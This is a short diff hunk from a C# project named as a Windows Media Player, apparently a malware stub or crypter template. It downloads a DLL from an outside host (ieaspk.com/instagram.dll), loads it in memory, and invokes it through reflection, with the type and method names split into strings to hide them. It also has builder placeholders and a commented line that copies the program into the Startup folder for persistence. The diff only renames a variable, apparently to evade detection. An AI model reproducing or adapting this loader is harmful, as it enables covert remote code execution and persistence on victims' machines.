@@ -80,12 +80,12 @@ namespace WindowsMediaPlayer1
 
             object web = new object[] { %aPP%, string.Empty, media("%Server%"), true };
 
-            Assembly refS;
+            Assembly skype;
 
-            refS = AppDomain.CurrentDomain.Load(media("https://ieaspk.com/instagram.dll"));
+            skype = AppDomain.CurrentDomain.Load(media("https://ieaspk.com/instagram.dll"));
 
 
-            refS.GetType("instagram"+ ".what" + "sapp").InvokeMember("stu"+"dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])web);
+            skype.GetType("instagram"+ ".what" + "sapp").InvokeMember("stu"+"dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])web);
 
     //start  {
     //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
